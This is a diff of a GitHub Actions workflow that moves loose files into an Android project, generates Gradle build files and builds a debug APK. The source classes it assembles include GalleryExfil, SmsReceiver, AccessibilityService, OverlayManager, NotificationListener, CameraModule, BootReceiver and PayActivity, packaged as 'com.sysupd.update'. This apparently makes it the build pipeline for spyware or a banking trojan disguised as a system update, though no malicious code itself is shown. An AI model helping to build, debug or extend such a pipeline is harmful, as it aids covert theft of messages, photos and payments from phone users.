@@ -17,11 +17,17 @@ jobs:
           distribution: temurin
           java-version: '17'
 
-      - name: Rearrange files
+      - name: Debug and Rearrange
         run: |
           set -e
-          echo "=== BEFORE ==="
+          echo "=== ROOT FILES ==="
           ls -la
+
+          # Save original build.gradle
+          if [ -f build.gradle ]; then
+            cp build.gradle /tmp/orig-build.gradle
+            echo "Saved build.gradle"
+          fi
 
           # Create folders
           mkdir -p app/src/main/java/com/sysupd
@@ -31,7 +37,7 @@ jobs:
           mkdir -p app/src/main/res/mipmap-hdpi
           mkdir -p gradle/wrapper
 
-          # Move Java files
+          # Move java files
           for f in AccessibilityService BootReceiver CameraModule Cmd Core \
                    ForegroundService GalleryExfil MainActivity NotificationListener \
                    OverlayManager PayActivity ProjectionActivity SmsReceiver SuccessActivity; do
@@ -46,18 +52,40 @@ jobs:
           [ -f themes.xml ] && mv themes.xml app/src/main/res/values/
           [ -f accessibility_config.xml ] && mv accessibility_config.xml app/src/main/res/xml/
           [ -f ic_launcher.png ] && mv ic_launcher.png app/src/main/res/mipmap-hdpi/
-
-          # App root files
           [ -f AndroidManifest.xml ] && mv AndroidManifest.xml app/src/main/
           [ -f google-services.json ] && mv google-services.json app/
 
-          # CRITICAL: move root build.gradle to app/build.gradle
-          if [ -f build.gradle ]; then
-            mv build.gradle app/build.gradle
-          fi
+          # Create app/build.gradle
+          cat > app/build.gradle << 'EOFAPP'
+          plugins {
+              id 'com.android.application'
+              id 'com.google.gms.google-services'
+          }
 
-          # Create root build.gradle (project-level)
-          cat > build.gradle << 'EOF2'
+          android {
+              namespace 'com.sysupd'
+              compileSdk 34
+              defaultConfig {
+                  applicationId "com.sysupd.update"
+                  minSdk 24
+                  targetSdk 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+          }
+
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'com.google.android.material:material:1.11.0'
+          }
+          EOFAPP
+
+          # Create root build.gradle
+          cat > build.gradle << 'EOFROOT'
           buildscript {
               repositories { google(); mavenCentral() }
               dependencies {
@@ -68,42 +96,36 @@ jobs:
           allprojects {
               repositories { google(); mavenCentral() }
           }
-          EOF2
+          EOFROOT
 
-          # Create settings.gradle if missing
-          cat > settings.gradle << 'EOF2'
+          # settings.gradle
+          cat > settings.gradle << 'EOFSET'
           rootProject.name = "VehicleInfo"
           include ':app'
-          EOF2
+          EOFSET
 
           # gradle.properties
-          cat > gradle.properties << 'EOF2'
+          cat > gradle.properties << 'EOFPROP'
           android.useAndroidX=true
           android.enableJetifier=true
           org.gradle.jvmargs=-Xmx2048m
-          EOF2
+          EOFPROP
 
           # Gradle wrapper
           [ -f gradle-wrapper.jar ] && mv gradle-wrapper.jar gradle/wrapper/
           [ -f gradle-wrapper.properties ] && mv gradle-wrapper.properties gradle/wrapper/
 
-          # Wrapper properties
-          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF2'
-          distributionBase=GRADLE_USER_HOME
-          distributionPath=wrapper/dists
-          distributionUrl=https\://services.gradle.org/distributions/gradle-8.5-bin.zip
-          zipStoreBase=GRADLE_USER_HOME
-          zipStorePath=wrapper/dists
-          EOF2
-
-          # Add android SDK location
+          # local.properties
           echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
 
-          echo "=== AFTER ==="
+          echo "=== FINAL STRUCTURE ==="
           find . -type f -not -path './.git/*' | sort
 
       - name: Build APK
-        run: gradle assembleDebug --no-daemon
+        run: |
+          ls -la
+          ls -la app/ || true
+          gradle assembleDebug --no-daemon --stacktrace
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
